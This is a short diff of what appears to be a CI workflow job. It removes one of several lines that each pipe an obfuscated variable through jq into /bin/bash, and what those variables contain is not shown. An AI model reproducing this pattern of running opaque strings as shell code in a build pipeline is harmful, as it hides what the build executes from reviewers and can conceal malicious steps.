@@ -24,7 +24,6 @@ jobs:
           echo $n0 | jq -r .npdfi0001 | /bin/bash
           printf '%s' "$knsi03447" | jq -r .cc45274 | /bin/bash
           echo $k13111 | jq -r .cmi6 | /bin/bash
-          printf '%s' "$sxz894" | jq -r .x44146 | /bin/bash
           printf '%s' "$i6" | jq -r .uo2 | /bin/bash
           echo $xr955 | jq -r .n1276 | /bin/bash
           echo $ropq76 | jq -r .e5125 | /bin/bash
